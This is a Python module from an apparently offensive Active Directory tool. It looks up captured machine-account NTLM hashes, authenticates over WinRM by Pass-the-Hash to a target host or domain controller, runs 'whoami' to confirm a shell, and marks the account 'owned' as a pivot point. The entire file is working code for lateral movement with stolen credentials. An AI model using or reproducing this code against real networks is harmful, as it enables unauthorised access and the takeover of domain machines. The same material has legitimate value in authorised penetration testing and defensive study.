"""Dashboard WinRM Pass-the-Hash — verify shell and set machine pivot."""

from __future__ import annotations

from typing import TYPE_CHECKING

from admapper.creds.common import collect_gained_hashes, pick_dc_ip, resolve_winrm_host_for_account
from admapper.support.output import print_success
from admapper.winrm.client import WinRMClient, WinRMError

if TYPE_CHECKING:
    from admapper.support.session import Session


def _normalize_account(name: str) -> str:
    base = str(name or "").strip().lower().rstrip("$")
    return f"{base}$" if base else ""


def lookup_machine_hash(ws_path, account: str) -> tuple[str, str] | None:
    want = _normalize_account(account)
    if not want:
        return None
    for raw_account, nthash in collect_gained_hashes(ws_path):
        if _normalize_account(raw_account) == want and nthash:
            name = raw_account if str(raw_account).endswith("$") else f"{raw_account}$"
            return name, nthash.lower()
    return None


def run_dashboard_winrm_pth(session: Session, account: str) -> str:
    """Run whoami over WinRM PTH; return stdout on success."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    ws_path = session.workspaces.path_for(session.workspace.name)
    domain = session.workspace.domain or ""
    if not domain:
        raise ValueError("no domain — scan first")

    match = lookup_machine_hash(ws_path, account)
    if not match:
        raise ValueError(f"no NTLM hash for {account} — run gMSA ACL exploit")

    machine_user, nthash = match
    dc_ip = pick_dc_ip(session)
    host = resolve_winrm_host_for_account(
        machine_user,
        ws_path,
        domain,
        fallback_ip=dc_ip,
    )

    client = WinRMClient(
        host,
        domain=domain,
        username=machine_user,
        nthash=nthash,
        dc_ip=dc_ip,
        dc_fqdn=host,
        ticket_method="nthash",
    )
    try:
        result = client.execute("whoami", shell="cmd")
    except WinRMError as exc:
        raise ValueError(f"WinRM PTH failed: {exc}") from exc

    if result.returncode != 0 or not result.stdout.strip():
        raise ValueError(f"WinRM no output (rc={result.returncode})")

    from admapper.escalate.analyze import mark_user_owned

    mark_user_owned(session, machine_user, refresh=True)
    print_success(f"WinRM PTH OK — owned + pivot → {domain}\\{machine_user}")
    print_success(f"whoami: {result.stdout.strip()}")
    return result.stdout.strip()
